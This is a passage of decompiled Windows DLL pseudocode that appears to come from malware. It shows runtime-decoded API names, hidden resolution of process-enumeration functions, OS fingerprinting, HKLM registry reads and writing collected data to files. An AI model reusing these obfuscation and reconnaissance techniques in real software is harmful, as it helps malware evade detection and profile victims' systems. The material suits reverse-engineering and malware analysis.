    _CxxThrowException(&pExceptionObject, &_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);
// 1000D701: using guessed type int __thiscall sub_1000D701(_DWORD);

//----- (10001C1E) --------------------------------------------------------
void __thiscall sub_10001C1E(_DWORD *this)
{
  this[1] = 0;
  this[2] = 16;
  *this = &mm::data::List<FZwxyjh *>::`vftable';
  this[3] = operator new(0x40u);
}
// 1001B34C: using guessed type void *mm::data::List<FZwxyjh *>::`vftable';

//----- (10001C4D) --------------------------------------------------------
void __thiscall sub_10001C4D(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[3];
  *this = &mm::data::List<FZwxyjh *>::`vftable';
  j_j__free(v2);
  this[3] = 0;
}
// 1001B34C: using guessed type void *mm::data::List<FZwxyjh *>::`vftable';

//----- (10001C65) --------------------------------------------------------
int __thiscall sub_10001C65(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != sub_10002E1A(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a3, &unk_1001B2A1);
  v4 = *this;
  v5 = sub_10002E1A(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 24))(this, v5 + 1);
  for ( i = sub_10002E1A(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001CC2) --------------------------------------------------------
int __thiscall sub_10001CC2(int *this, int a2)
{
  int v3; // edi
  int v4; // eax

  v3 = *this;
  v4 = sub_10002E1A(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 4))(this, a2, v4);
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001CDC) --------------------------------------------------------
int __thiscall sub_10001CDC(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int result; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B2A2);
  --this[1];
  while ( v2 < sub_10002E1A(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  result = sub_10002E1A(this);
  *(_DWORD *)(this[3] + 4 * result) = 0;
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001D1E) --------------------------------------------------------
int __thiscall sub_10001D1E(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B2A3);
  return this[3] + 4 * a2;
}

//----- (10001D3C) --------------------------------------------------------
int __thiscall sub_10001D3C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B2A4);
  return this[3] + 4 * a2;
}

//----- (10001D5A) --------------------------------------------------------
void **__thiscall sub_10001D5A(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int, _DWORD, int); // ebx
  int v4; // eax
  void *v6; // [esp-Ch] [ebp-14h]
  int v7; // [esp-8h] [ebp-10h]

  if ( a2 != this )
  {
    j_j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int, _DWORD, int))*this;
    this[2] = (void *)1;
    v7 = sub_10002E1A(a2);
    v6 = a2[3];
    v4 = sub_10002E1A(a2);
    ((void (__thiscall **)(void **, int, void *, int))v3)[15](this, v4, v6, v7);
  }
  return this;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001D99) --------------------------------------------------------
int __thiscall sub_10001D99(void **this)
{
  void *v2; // edx

  j_j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  return (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 15))(this, 0, 0, 1);
}

//----- (10001DB9) --------------------------------------------------------
unsigned int __thiscall sub_10001DB9(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B2A5);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 24))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 24))(a4, this[1] - a2);
  v5 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 8))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 8))(a3, this[3] + 4 * v5);
      ++v5;
      result = sub_10002E1A(this);
    }
    while ( v5 < result );
  }
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001E2B) --------------------------------------------------------
unsigned int __thiscall sub_10001E2B(_DWORD *this)
{
  unsigned int v2; // ebx
  unsigned int result; // eax
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // eax
  int v8; // ecx
  int *v9; // edx
  int v10; // edi

  sub_1000D728();
  v2 = 0;
  result = sub_10002E1A(this);
  if ( (result & 0xFFFFFFFE) != 0 )
  {
    do
    {
      v4 = sub_10002E1A(this);
      v5 = sub_1000D71A(v4);
      v6 = sub_10002E1A(this);
      v7 = sub_1000D71A(v6);
      v8 = this[3];
      v9 = (int *)(v8 + 4 * v5);
      v10 = *v9;
      v7 *= 4;
      *v9 = *(_DWORD *)(v7 + v8);
      *(_DWORD *)(v7 + this[3]) = v10;
      ++v2;
      result = (unsigned int)sub_10002E1A(this) >> 1;
    }
    while ( v2 < result );
  }
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);
// 1000D71A: using guessed type _DWORD __cdecl sub_1000D71A(_DWORD);
// 1000D728: using guessed type int sub_1000D728(void);

//----- (10001E8B) --------------------------------------------------------
unsigned int __stdcall sub_10001E8B(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10001E9C) --------------------------------------------------------
unsigned int __thiscall sub_10001E9C(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 56))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = sub_10002E1A(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (10001EF9) --------------------------------------------------------
_DWORD *__thiscall sub_10001EF9(_DWORD *Block, char a2)
{
  sub_10001A65(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001F15) --------------------------------------------------------
_DWORD *__thiscall sub_10001F15(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  *this = &sr::TyxCkOnhqdgZuatyxcko::`vftable';
  return result;
}
// 1001B390: using guessed type void *sr::TyxCkOnhqdgZuatyxcko::`vftable';

//----- (10001F20) --------------------------------------------------------
_DWORD *__thiscall sub_10001F20(_DWORD *Block, char a2)
{
  sub_10001C4D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001F3C) --------------------------------------------------------
_DWORD *__thiscall sub_10001F3C(_DWORD *Block, char a2)
{
  sub_1000D70F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001F58) --------------------------------------------------------
void __thiscall sub_10001F58(_DWORD *this)
{
  _DWORD *v2; // edi
  void (__thiscall ***v3)(_DWORD, int); // ecx
  unsigned int j; // esi
  void (__thiscall ***v5)(_DWORD, int); // ecx
  int v6; // [esp+14h] [ebp-14h]
  unsigned int i; // [esp+18h] [ebp-10h]

  *this = &Jclfvc::`vftable';
  v2 = this + 13;
  v6 = 3;
  do
  {
    for ( i = 0; i < sub_10002E1A(v2 - 12); ++i )
    {
      v3 = *(void (__thiscall ****)(_DWORD, int))(*(int (__thiscall **)(_DWORD *, unsigned int))(*(v2 - 12) + 16))(
                                                   v2 - 12,
                                                   i);
      if ( v3 )
        (**v3)(v3, 1);
    }
    for ( j = 0; j < sub_10002E1A(v2); ++j )
    {
      v5 = *(void (__thiscall ****)(_DWORD, int))(*(int (__thiscall **)(_DWORD *, unsigned int))(*v2 + 16))(v2, j);
      if ( v5 )
        (**v5)(v5, 1);
    }
    v2 += 4;
    --v6;
  }
  while ( v6 );
  `eh vector destructor iterator'(this + 13, 0x10u, 3, (void (__thiscall *)(void *))sub_10001C4D);
  `eh vector destructor iterator'(this + 1, 0x10u, 3, (void (__thiscall *)(void *))sub_10001A65);
}
// 1001B398: using guessed type void *Jclfvc::`vftable';

//----- (1000201E) --------------------------------------------------------
unsigned int __thiscall sub_1000201E(_DWORD *this, int a2)
{
  unsigned int result; // eax
  _DWORD *v3; // eax
  unsigned int i; // [esp+14h] [ebp-14h]

  for ( i = 0; ; ++i )
  {
    result = sub_10002E1A(&this[4 * a2 + 1]);
    if ( i >= result )
      break;
    v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, unsigned int))(this[4 * a2 + 1] + 16))(&this[4 * a2 + 1], i);
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)*v3 + 4))(*v3);
  }
  return result;
}

//----- (1000207A) --------------------------------------------------------
void __thiscall sub_1000207A(_DWORD *this, int a2)
{
  _DWORD *v2; // ebx
  _DWORD *v3; // esi
  unsigned int i; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // edi
  _DWORD *v8; // esi
  int v9; // ebx
  _DWORD *v10; // eax
  void (__thiscall **v11)(_DWORD *, int, int); // edi
  int v12; // eax
  _DWORD *v13; // eax
  int *v14; // esi
  unsigned int v15; // eax
  int v16; // eax
  _DWORD *v17; // eax
  _DWORD *v18; // [esp+10h] [ebp-2Ch]
  _DWORD *v19; // [esp+14h] [ebp-28h]
  int v21; // [esp+1Ch] [ebp-20h] BYREF
  _DWORD *v22; // [esp+20h] [ebp-1Ch]
  size_t v23; // [esp+24h] [ebp-18h]
  unsigned int v24; // [esp+28h] [ebp-14h]
  int v25; // [esp+38h] [ebp-4h]

  v2 = this;
  v23 = 0;
  if ( a2 >= 0 )
  {
    v3 = this + 1;
    v22 = (_DWORD *)(a2 + 1);
    do
    {
      for ( i = 0; i < sub_10002E1A(v3); ++i )
      {
        v5 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, unsigned int))(*v3 + 16))(v3, i);
        v23 += (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v5 + 8))(*v5);
      }
      v3 += 4;
      v22 = (_DWORD *)((char *)v22 - 1);
    }
    while ( v22 );
  }
  v6 = operator new(v23 + 4);
  v7 = v6;
  v19 = v6;
  if ( v6 )
  {
    v22 = v6 + 1;
    if ( a2 >= 0 )
    {
      v8 = v2 + 1;
      v21 = a2 + 1;
      do
      {
        v24 = 0;
        if ( sub_10002E1A(v8) )
        {
          do
          {
            v9 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *, unsigned int))(*v8 + 16))(v8, v24);
            v10 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, unsigned int))(*v8 + 16))(v8, v24);
            v18 = (_DWORD *)*v10;
            v11 = (void (__thiscall **)(_DWORD *, int, int))(*(_DWORD *)*v10 + 12);
            v12 = (*(int (__thiscall **)(int))(*(_DWORD *)v9 + 8))(v9);
            (*v11)(v18, (int)v22, v12);
            v13 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, unsigned int))(*v8 + 16))(v8, v24);
            v22 = (_DWORD *)((char *)v22 + (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v13 + 8))(*v13));
            ++v24;
          }
          while ( v24 < sub_10002E1A(v8) );
          v2 = this;
          v7 = v19;
        }
        v8 += 4;
        --v21;
      }
      while ( v21 );
    }
    v21 = 0;
    if ( !sub_10001801(v7 + 1, v23, (size_t *)&v21) )
      goto LABEL_18;
    v24 = 0;
    *v7 = 1094795588;
    while ( 1 )
    {
      v14 = &v2[4 * a2 + 13];
      v15 = sub_10002E1A(v14);
      if ( v24 >= v15 )
        break;
      v16 = *v14;
      v25 = 0;
      v17 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v16 + 16))(v14, v24);
      (*(void (__thiscall **)(_DWORD, _DWORD *, int, int))(*(_DWORD *)*v17 + 4))(*v17, v7, v21 + 4, a2);
      v25 = -1;
      ++v24;
    }
    if ( v7 )
LABEL_18:
      j_j__free(v7);
  }
}

//----- (100021F6) --------------------------------------------------------
_DWORD *__thiscall sub_100021F6(_DWORD *this)
{
  int i; // edi
  _DWORD pExceptionObject[5]; // [esp+14h] [ebp-14h] BYREF

  *this = &Jclfvc::`vftable';
  `eh vector constructor iterator'(
    this + 1,
    0x10u,
    3,
    (void (__thiscall *)(void *))sub_10001A36,
    (void (__thiscall *)(void *))sub_10001A65);
  pExceptionObject[4] = 2;
  `eh vector constructor iterator'(
    this + 13,
    0x10u,
    3,
    (void (__thiscall *)(void *))sub_10001C1E,
    (void (__thiscall *)(void *))sub_10001C4D);
  if ( !sub_100010FC(this) )
  {
    sub_1000D6BF(pExceptionObject);
    _CxxThrowException(pExceptionObject, &_TI1_AVSnsziibtx_sr__);
  }
  for ( i = 0; i < 3; ++i )
  {
    sub_1000201E(this, i);
    sub_1000207A(this, i);
  }
  return this;
}
// 1001B398: using guessed type void *Jclfvc::`vftable';

//----- (1000228F) --------------------------------------------------------
_DWORD *__thiscall sub_1000228F(_DWORD *Block, char a2)
{
  sub_10001F58(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100022AB) --------------------------------------------------------
void __cdecl sub_100022AB()
{
  _DWORD v0[29]; // [esp+10h] [ebp-74h] BYREF

  v0[28] = 0;
  sub_100021F6(v0);
  sub_10001F58(v0);
}

//----- (100022D7) --------------------------------------------------------
int __cdecl sub_100022D7(__int64 *a1)
{
  __int64 v1; // rdi
  __int64 v2; // rax
  SYSTEMTIME SystemTime; // [esp+Ch] [ebp-18h] BYREF
  struct _FILETIME FileTime; // [esp+1Ch] [ebp-8h] BYREF

  v1 = *a1;
  SystemTime.wYear = 1970;
  SystemTime.wMonth = 1;
  SystemTime.wDay = 1;
  SystemTime.wHour = 0;
  SystemTime.wMinute = 0;
  SystemTime.wSecond = 0;
  SystemTime.wMilliseconds = 0;
  if ( SystemTimeToFileTime(&SystemTime, &FileTime) )
    return (v1 - *(_QWORD *)&FileTime) / 0x989680ui64;
  else
    LODWORD(v2) = -1;
  return v2;
}

//----- (1000233F) --------------------------------------------------------
char __cdecl sub_1000233F(void *a1)
{
  const CHAR *v1; // eax
  HMODULE ModuleHandleA; // ebx
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  void *v6; // eax
  int i; // eax
  int v8; // eax
  unsigned int v10; // [esp-10h] [ebp-3Ch] BYREF
  FARPROC v11; // [esp+0h] [ebp-2Ch]
  FARPROC ProcAddress; // [esp+4h] [ebp-28h]
  FARPROC v13; // [esp+8h] [ebp-24h]
  HANDLE hObject; // [esp+Ch] [ebp-20h]
  char v15; // [esp+13h] [ebp-19h]
  unsigned int *v16; // [esp+14h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+1Ch] [ebp-10h]
  int (__cdecl *v18)(int, PVOID, int); // [esp+20h] [ebp-Ch]
  void *v19; // [esp+24h] [ebp-8h]
  int v20; // [esp+28h] [ebp-4h]
  int v21[74]; // [esp+2Ch] [ebp+0h] BYREF
  CHAR String1[264]; // [esp+154h] [ebp+128h] BYREF
  unsigned int v23; // [esp+25Ch] [ebp+230h]

  v19 = &unk_10021D20;
  v18 = SEH_10010F90;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v19 = (void *)(dword_100249C0 ^ (unsigned int)&unk_10021D20);
  v23 = (unsigned int)v21 ^ dword_100249C0;
  v10 = (unsigned int)v21 ^ dword_100249C0;
  v16 = &v10;
  hObject = 0;
  v20 = 0;
  memset(a1, 0, 0x68B4u);
  *((_DWORD *)a1 + 6700) = 0;
  memset(v21, 0, sizeof(v21));
  v1 = (const CHAR *)sub_1000C0E0(&unk_1001B3A4);
  ModuleHandleA = GetModuleHandleA(v1);
  if ( !ModuleHandleA )
    goto LABEL_13;
  v3 = (const CHAR *)sub_1000C0E0(&unk_1001B3C8);
  ProcAddress = GetProcAddress(ModuleHandleA, v3);
  v4 = (const CHAR *)sub_1000C0E0(&unk_1001B3F8);
  v13 = GetProcAddress(ModuleHandleA, v4);
  v5 = (const CHAR *)sub_1000C0E0(&unk_1001B41C);
  v11 = GetProcAddress(ModuleHandleA, v5);
  if ( !v11 || !v13 || !ProcAddress )
  {
    v15 = 0;
    goto LABEL_14;
  }
  v6 = (void *)((int (__stdcall *)(int, _DWORD))ProcAddress)(2, 0);
  hObject = v6;
  if ( v6 == (void *)-1 )
  {
LABEL_13:
    v15 = 0;
  }
  else
  {
    v21[0] = 296;
    for ( i = ((int (__stdcall *)(void *, int *))v13)(v6, v21); i; i = ((int (__stdcall *)(HANDLE, int *))v11)(
                                                                         hObject,
                                                                         v21) )
    {
      if ( *((_DWORD *)a1 + 6700) < 0x64u )
      {
        lstrcpynA(String1, (LPCSTR)&v21[9], 261);
        v8 = lstrlenA(String1);
        CharLowerBuffA(String1, v8);
        PathStripPathA(String1);
        lstrcpynA((LPSTR)a1 + 268 * *((_DWORD *)a1 + 6700), String1, 261);
        *((_DWORD *)a1 + 67 * (*((_DWORD *)a1 + 6700))++ + 66) = v21[2];
      }
      v21[0] = 296;
    }
    v15 = 1;
  }
LABEL_14:
  v20 = -2;
  if ( hObject )
    CloseHandle(hObject);
  return v15;
}
// 1000C0E0: using guessed type _DWORD __cdecl sub_1000C0E0(_DWORD);
// 100249C0: using guessed type int dword_100249C0;

//----- (10002538) --------------------------------------------------------
int sub_10002538()
{
  int result; // eax
  _DWORD VersionInformation[39]; // [esp+0h] [ebp-28h] BYREF

  result = Val;
  if ( !Val )
  {
    memset(&VersionInformation[1], Val, 0x98u);
    VersionInformation[0] = 156;
    if ( !GetVersionExA((LPOSVERSIONINFOA)VersionInformation) )
    {
      result = 1024;
      Val = 1024;
      return result;
    }
    if ( VersionInformation[4] == 1 )
    {
      if ( VersionInformation[2] )
      {
        if ( VersionInformation[2] == 10 )
        {
          Val = 2 * (BYTE1(VersionInformation[5]) == 65) + 2;
          return Val;
        }
        if ( VersionInformation[2] == 90 )
        {
          Val = 8;
          return Val;
        }
LABEL_29:
        if ( !Val )
          Val = 1024;
        return Val;
      }
      Val = 1;
    }
    if ( VersionInformation[4] == 2 )
    {
      switch ( VersionInformation[1] )
      {
        case 4:
          Val = 16;
          break;
        case 5:
          if ( VersionInformation[2] )
          {
            if ( VersionInformation[2] == 1 )
            {
              Val = 64;
              return Val;
            }
            if ( VersionInformation[2] == 2 )
            {
              Val = 128;
              return Val;
            }
          }
          else
          {
            Val = 32;
          }
          break;
        case 6:
          if ( VersionInformation[2] )
          {
            if ( VersionInformation[2] == 1 )
            {
              Val = 2048;
              return Val;
            }
          }
          else if ( BYTE2(VersionInformation[38]) == 1 )
          {
            Val = 256;
          }
          else if ( BYTE2(VersionInformation[38]) == 3 )
          {
            Val = 512;
            return Val;
          }
          break;
      }
    }
    goto LABEL_29;
  }
  return result;
}

//----- (10002683) --------------------------------------------------------
bool __cdecl sub_10002683(LPCSTR lpFileName)
{
  return GetFileAttributesA(lpFileName) != -1;
}

//----- (10002698) --------------------------------------------------------
LSTATUS __cdecl sub_10002698(HKEY hKey, LPCSTR lpSubKey)
{
  LSTATUS v2; // esi
  HKEY phkResult; // [esp+4h] [ebp-4h] BYREF

  phkResult = 0;
  v2 = RegOpenKeyExA(hKey, lpSubKey, 0, 0x20019u, &phkResult);
  if ( v2 )
    RegCloseKey(phkResult);
  return v2;
}

//----- (100026CC) --------------------------------------------------------
LSTATUS __cdecl sub_100026CC(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, DWORD cbData, void *a6)
{
  LSTATUS v6; // edi
  LSTATUS v7; // eax
  HKEY phkResult; // [esp+8h] [ebp-4h] BYREF

  phkResult = 0;
  v6 = 0;
  v7 = RegOpenKeyExA(hKey, lpSubKey, 0, 0x20019u, &phkResult);
  if ( v7 || (v7 = RegQueryValueExA(phkResult, lpValueName, 0, 0, lpData, &cbData)) != 0 )
    v6 = v7;
  if ( phkResult )
    RegCloseKey(phkResult);
  if ( a6 )
    memcpy(a6, &cbData, 4u);
  return v6;
}

//----- (1000273E) --------------------------------------------------------
bool __cdecl sub_1000273E(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, int a5)
{
  LSTATUS v6; // edi
  DWORD cbData; // [esp+0h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+4h] [ebp-4h] BYREF

  if ( RegOpenKeyExA(hKey, lpSubKey, 0, 1u, &phkResult) )
    return 0;
  cbData = a5;
  v6 = RegQueryValueExA(phkResult, lpValueName, 0, 0, lpData, &cbData);
  RegCloseKey(phkResult);
  return v6 == 0;
}

//----- (10002790) --------------------------------------------------------
char __cdecl sub_10002790(LPCSTR lpString, _DWORD *a2)
{
  const CHAR *v2; // eax
  HMODULE ModuleHandleA; // edi
  const CHAR *v4; // eax
  FARPROC ProcAddress; // ebx
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  FARPROC v8; // eax
  void *v9; // edi
  int i; // eax
  int v11; // eax
  char v13; // bl
  int (__stdcall *v14)(void *, int *); // [esp+14h] [ebp-78h]
  FARPROC v15; // [esp+18h] [ebp-74h]
  int v16[74]; // [esp+1Ch] [ebp-70h] BYREF

  *a2 = 0;
  if ( (unsigned int)(lstrlenA(lpString) - 1) > 0x103 )
    return 0;
  v2 = (const CHAR *)sub_1000C0E0(&unk_1001B45C);
  ModuleHandleA = GetModuleHandleA(v2);
  if ( !ModuleHandleA )
    return 0;
  v4 = (const CHAR *)sub_1000C0E0(&unk_1001B480);
  ProcAddress = GetProcAddress(ModuleHandleA, v4);
  v6 = (const CHAR *)sub_1000C0E0(&unk_1001B4B0);
  v15 = GetProcAddress(ModuleHandleA, v6);
  v7 = (const CHAR *)sub_1000C0E0(&unk_1001B4D4);
  v8 = GetProcAddress(ModuleHandleA, v7);
  v14 = (int (__stdcall *)(void *, int *))v8;
  if ( !ProcAddress )
    return 0;
  if ( !v15 )
    return 0;
  if ( !v8 )
    return 0;
  v9 = (void *)((int (__stdcall *)(int, _DWORD))ProcAddress)(2, 0);
  if ( v9 == (void *)-1 )
    return 0;
  memset(v16, 0, sizeof(v16));
  v16[0] = 296;
  for ( i = ((int (__stdcall *)(void *, int *))v15)(v9, v16); ; i = v14(v9, v16) )
  {
    if ( !i )
    {
      CloseHandle(v9);
      return 0;
    }
    v11 = lstrlenA((LPCSTR)&v16[9]);
    if ( v11 <= 0 || v11 > 260 )
      break;
    if ( !lstrcmpiA(lpString, (LPCSTR)&v16[9]) )
    {
      *a2 = v16[2];
      v13 = 1;
      goto LABEL_18;
    }
  }
  v13 = 0;
LABEL_18:
  CloseHandle(v9);
  return v13;
}
// 1000C0E0: using guessed type _DWORD __cdecl sub_1000C0E0(_DWORD);

//----- (100028D5) --------------------------------------------------------
char __stdcall sub_100028D5(void *Src, size_t Size, int a3)
{
  char *v3; // eax
  char *v4; // esi

  if ( !Src )
    return 0;
  v3 = (char *)operator new(Size + 1);
  v4 = v3;
  if ( !v3 )
    return 0;
  memcpy(v3, Src, Size);
  v4[Size] = 0;
  strlen(v4);
  sub_1000EBB8(&unk_1001B4F8, v4);
  j__free(v4);
  return 1;
}
// 1000EBB8: using guessed type _DWORD __cdecl sub_1000EBB8(_DWORD, _DWORD);

//----- (10002926) --------------------------------------------------------
char __cdecl sub_10002926(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, int a3)
{
  const CHAR *v3; // eax
  const char *v4; // eax
  HANDLE FileA; // eax
  char pExceptionObject[4]; // [esp+10h] [ebp-2Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-28h] BYREF
  char v9[4]; // [esp+18h] [ebp-24h] BYREF
  char v10[4]; // [esp+1Ch] [ebp-20h] BYREF
  char v11[4]; // [esp+20h] [ebp-1Ch] BYREF
  HANDLE hObject; // [esp+24h] [ebp-18h]
  char v13; // [esp+2Bh] [ebp-11h]
  int v14; // [esp+38h] [ebp-4h]
  char Buffer[264]; // [esp+3Ch] [ebp+0h] BYREF
  CHAR Dst[264]; // [esp+144h] [ebp+108h] BYREF

  v13 = 0;
  if ( lpBuffer )
  {
    memset(Dst, 0, 261);
    hObject = (HANDLE)-1;
    NumberOfBytesWritten = 0;
    v14 = 0;
    v3 = (const CHAR *)sub_1000C0E0(&unk_1001B4FC);
    if ( !ExpandEnvironmentStringsA(v3, Dst, 0x104u) )
    {
      sub_1000D6BF(pExceptionObject);
      _CxxThrowException(pExceptionObject, &_TI1_AVSnsziibtx_sr__);
    }
    memset(Buffer, 0, 261);
    v4 = (const char *)sub_1000C0E0(&unk_1001B524);
    _snprintf(Buffer, 0x104u, v4, a3);
    if ( !PathAppendA(Dst, Buffer) )
    {
      sub_1000D6BF(v9);
      _CxxThrowException(v9, &_TI1_AVSnsziibtx_sr__);
    }
    FileA = CreateFileA(Dst, 0x1F01FFu, 0, 0, 2u, 0, 0);
    hObject = FileA;
    if ( FileA == (HANDLE)-1 )
    {
      sub_1000D6BF(v11);
      _CxxThrowException(v11, &_TI1_AVSnsziibtx_sr__);
    }
    if ( !WriteFile(FileA, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
    {
      sub_1000D6BF(v10);
      _CxxThrowException(v10, &_TI1_AVSnsziibtx_sr__);
    }
    v13 = 1;
    if ( hObject != (HANDLE)-1 )
      CloseHandle(hObject);
  }
  return v13;
}
// 1000C0E0: using guessed type _DWORD __cdecl sub_1000C0E0(_DWORD);
// 1000D6BF: using guessed type int __thiscall sub_1000D6BF(_DWORD);
// 10002926: using guessed type char pExceptionObject[4];
// 10002926: using guessed type char var_238[4];
// 10002926: using guessed type char var_230[4];
// 10002926: using guessed type char var_234[4];

//----- (10002AB9) --------------------------------------------------------
_DWORD *__thiscall sub_10002AB9(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 23;
  *this = &EnvcjlRxleLhdyndhoa::`vftable';
  memset(this + 2, 0, 0xA4u);
  *v2 = this[1];
  return this;
}
// 1001B650: using guessed type void *EnvcjlRxleLhdyndhoa::`vftable';

//----- (10002AE7) --------------------------------------------------------
int __thiscall sub_10002AE7(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
}

//----- (10002AEC) --------------------------------------------------------
int sub_10002AEC()
{
  return 164;
}

//----- (10002AF2) --------------------------------------------------------
char __thiscall sub_10002AF2(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0xA4 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0xA4u);
  return 1;
}

//----- (10002B17) --------------------------------------------------------
DWORD __thiscall sub_10002B17(int this)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  DWORD result; // eax
  const CHAR *v5; // [esp-10h] [ebp-1Ch]
  const CHAR *v6; // [esp-10h] [ebp-1Ch]

  *(_DWORD *)(this + 20) = sub_1000C2FB(this + 28, this + 24);
  *(_DWORD *)(this + 16) = GetLastError();
  v5 = (const CHAR *)sub_1000C0E0(&unk_1001B548);
  v2 = (const CHAR *)sub_1000C0E0(&unk_1001B570);
  if ( sub_100026CC(HKEY_LOCAL_MACHINE, v2, v5, (LPBYTE)(this + 36), 4u, 0) )
    *(_DWORD *)(this + 32) = GetLastError();
  v6 = (const CHAR *)sub_1000C0E0(&unk_1001B5BC);
  v3 = (const CHAR *)sub_1000C0E0(&unk_1001B5E8);
  result = sub_100026CC(HKEY_LOCAL_MACHINE, v3, v6, (LPBYTE)(this + 40), 0x7Cu, (void *)(this + 168));
  if ( result )
  {
    result = GetLastError();
    *(_DWORD *)(this + 32) = result;
  }
  return result;
}
// 1000C0E0: using guessed type _DWORD __cdecl sub_1000C0E0(_DWORD);
// 1000C2FB: using guessed type _DWORD __cdecl sub_1000C2FB(_DWORD, _DWORD);

//----- (10002BAB) --------------------------------------------------------
_DWORD *__thiscall sub_10002BAB(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 3;
  *this = &WgKywecmAkzvnhnww::`vftable';
  memset(this + 2, 0, 0x4B4u);
  *v2 = this[1];
  return this;
}
// 1001B90C: using guessed type void *WgKywecmAkzvnhnww::`vftable';

//----- (10002BD9) --------------------------------------------------------
int sub_10002BD9()
{
  return 1204;
}

//----- (10002BDF) --------------------------------------------------------
char __thiscall sub_10002BDF(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x4B4 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x4B4u);
  return 1;
}

//----- (10002C04) --------------------------------------------------------
char __thiscall sub_10002C04(char *this)
{
  HKEY **v1; // edi
  BYTE *v2; // esi
  DWORD LastError; // eax

  v1 = (HKEY **)&off_100241C0;
  v2 = (BYTE *)(this + 288);
  do
  {
